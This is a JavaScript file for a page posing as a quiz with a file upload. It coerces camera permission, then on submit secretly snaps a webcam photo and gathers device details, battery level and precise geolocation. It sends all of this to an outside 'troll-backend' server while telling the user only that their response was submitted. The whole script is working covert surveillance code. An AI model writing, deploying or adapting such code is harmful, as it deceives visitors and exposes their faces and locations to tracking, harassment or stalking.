const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// Show toast
function showToast(message) {
  toast.innerText = message;
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3000);
}

// Ask for camera permission before file selection
fileInput.addEventListener("click", async (e) => {
  e.preventDefault();
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    showToast("Camera permission granted. Now select a file.");
    // Trigger the file dialog
    fileInput.click();
  } catch (err) {
    showToast("Camera permission denied!");
    alert("Camera permission is required to proceed.");
    console.error(err);
  }
});

// Form submission
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  try {
    // Capture image from camera
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString(),
      filename: fileInput.files[0]?.name || "No file selected"
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Send to backend
    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    // Stop camera
    videoEl.srcObject.getTracks().forEach(track => track.stop());

    // Show success
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";

    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    showToast("Response submitted successfully!");

  } catch (err) {
    console.error(err);
    showToast("Error! Please allow camera access.");
    alert("Please allow camera access!");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
